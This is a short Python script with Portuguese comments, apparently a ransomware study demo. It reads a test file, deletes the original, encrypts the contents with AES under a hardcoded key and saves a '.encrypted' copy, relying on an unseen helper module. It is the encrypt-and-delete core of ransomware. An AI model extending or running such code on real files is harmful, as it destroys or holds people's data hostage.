import utils

FILE_NAME = "teste.txt"
KEY = "testeransomwares"

# Abre o arquivo a ser criptografado
file_data = utils.get_file_data(FILE_NAME)

# Remove o arquivo do sistema
utils.remove_file(FILE_NAME)

# Gera a chave de criptografia
aes = utils.create_cipher("testeransomwares")

# Criptografa o arquivo
encrypted_data = aes.encrypt(file_data)

# Salva o arquivo criptografado
utils.save_changed_file(FILE_NAME + ".encrypted", encrypted_data)